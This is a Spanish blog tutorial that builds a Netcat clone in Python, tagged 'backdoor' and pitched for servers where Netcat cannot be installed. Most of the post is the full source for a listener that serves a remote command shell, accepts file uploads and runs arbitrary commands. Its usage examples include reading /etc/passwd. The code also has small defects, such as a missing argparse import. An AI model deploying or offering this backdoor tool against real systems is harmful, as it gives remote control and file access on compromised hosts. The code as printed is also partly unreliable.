---
layout: single
title: "Como crear tu propia herramienta de hacking con Netcat en Python"
excerpt: "¡Este es nuestro ejemplo de Netcat en Python! En este tutorial, aprenderás cómo crear una herramienta de red de bajo nivel utilizando el lenguaje de programación Python. A través de la creación de una versión de Netcat, aprenderás sobre la creación de conexiones de red, el manejo de flujos de datos y la transmisión de información en tiempo real. Este tutorial es adecuado tanto para principiantes como para usuarios con experiencia en Python y es una excelente forma de ampliar tus habilidades en programación de redes. ¡Prepárate para sumergirte en el mundo de la programación de redes con Python! "
date: 2022-08-03 
classes: wide
header:
 teaser: /assets/images/netcat/nc.png
 teaser_home_page: true
categories:
  - Programación
tags:
  - seguridad
  - herramienta
  - networks
  - python
  - backdoor
---

En ocasiones vemos servidores que no tienen instalado NetCat y/o tampoco permite la instalacion de dicha herramienta, pero si que contamos con python, por lo que utilizaremos este lenguaje para montarnos una herramienta similiar al NetCat.

Vamos a ponerle de nombre al archivo **netcat.py** y empezamos importando las librerias necesarias para trabajar nuestra herramienta

```python
import socket
import shlex
import subprocess
import sys
import textwrap
import threading
```

Cabe resaltar que la libreria **subprocess** nos brinda la creacion de procesos para interactuar con los programas cliente. Creamos una funcion llamada **execute** y le pasamos como parametro ```cmd``` .  Empezamos con nuestra funcion y creamos una variable llamada cmd donde le pasamos el parametro cmd seguido del metodo _strip()_ , este metodo lo que nos hace es eliminar cualquier espacio delante o detras de la palabra. 

Despues de la sentencia if nos creamos una variable llamada **output** y haciendo uso esta misma libreria, subprocess, usamos el metodo _check_output_ que facilmente nos ejecuta un comando en el sistema operativo local y luego devuelve su resultado 

```python
def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return
    output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
    return output.decode()
```


```python
class NetCat:
    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def run(self):
        if self.args.listen:
            self.listen()
        else:
            self.send()

    def send(self):
        self.socket.connect((self.args.target, self.args.port))
        if self.buffer:
            self.socket.send(self.buffer)
        try:
            while True:
                recv_len = 1
                response = ''
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096:
                        break
                if response:
                    print(response)
                    buffer = input('> ')
                    buffer += '\n'
                    self.socket.send(buffer.encode())
        except KeyboardInterrupt:
            print('User terminated.')
            self.socket.close()
            sys.exit()

    def listen(self):
        print('listening')
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)
        while True:
            client_socket, _ = self.socket.accept()
            client_thread = threading.Thread(target=self.handle, args=(client_socket,))
            client_thread.start()

    def handle(self, client_socket):
        if self.args.execute:
            output = execute(self.args.execute)
            client_socket.send(output.encode())
        elif self.args.upload:
            file_buffer = b''
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                    print(len(file_buffer))
                else:
                    break
            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
            message = f'Saved file {self.args.upload}'
            client_socket.send(message.encode())
        elif self.args.command:
            cmd_buffer = b''
            while True:
                try:
                    client_socket.send(b' #> ')
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(64)
                    response = execute(cmd_buffer.decode())
                    if response:
                        client_socket.send(response.encode())
                    cmd_buffer = b''
                except Exception as e:
                    print(f'server killed {e}')
                    self.socket.close()
                    sys.exit()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='BHP Net Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''Example:
          netcat.py -t 192.168.1.108 -p 5555 -l -c # command shell
          netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.whatisup # upload to file
          netcat.py -t 192.168.1.108 -p 5555 -l -e=\"cat /etc/passwd\" # execute command
          echo 'ABCDEFGHI' | ./netcat.py -t 192.168.1.108 -p 135 # echo local text to server port 135
          netcat.py -t 192.168.1.108 -p 5555 # connect to server
          '''))
          
    parser.add_argument('-c', '--command', action='store_true', help='initialize command shell')
    parser.add_argument('-e', '--execute', help='execute specified command')
    parser.add_argument('-l', '--listen', action='store_true', help='listen')
    parser.add_argument('-p', '--port', type=int, default=5555, help='specified port')
    parser.add_argument('-t', '--target', default='192.168.1.203', help='specified IP')
    parser.add_argument('-u', '--upload', help='upload file')
    args = parser.parse_args()
    if args.listen:
        buffer = ''
    else:
        buffer = sys.stdin.read()
    nc = NetCat(args, buffer.encode('utf-8'))
    nc.run()
```